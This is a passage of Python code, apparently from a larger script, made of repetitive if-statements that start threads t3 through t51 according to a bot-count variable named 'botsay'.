if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t3.start()
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t4.start()
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t5.start()
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t6.start()
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t7.start()
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t8.start()
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t9.start()
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t10.start()
if botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t11.start()
if botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay== 16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t12.start()
if botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t13.start()
if botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t14.start()
if botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t15.start()
if botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t16.start()
if botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t17.start()
if botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t18.start()
if botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t19.start()
if botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t20.start()
if botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t21.start()
if botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t22.start()
if botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t23.start()
if botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t24.start()
if botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t25.start()
if botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t26.start()
if botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t27.start()
if botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t28.start()
if botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t29.start()
if botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t30.start()
if botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t31.start()
if botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t32.start()
if botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t33.start()
if botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t34.start()
if botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t35.start()
if botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t36.start()
if botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t37.start()
if botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t38.start()
if botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t39.start()
if botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t40.start()
if botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t41.start()
if botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t42.start()
if botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t43.start()
if botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t44.start()
if botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t45.start()
if botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t46.start()
if botsay==47 or botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t47.start()
if botsay==48 or botsay==49 or botsay==50 or botsay==51 :
	t48.start()
if botsay==49 or botsay==50 or botsay==51 :
	t49.start()
if botsay==50 or botsay==51 :
	t50.start()
if botsay==51 :
	t51.start()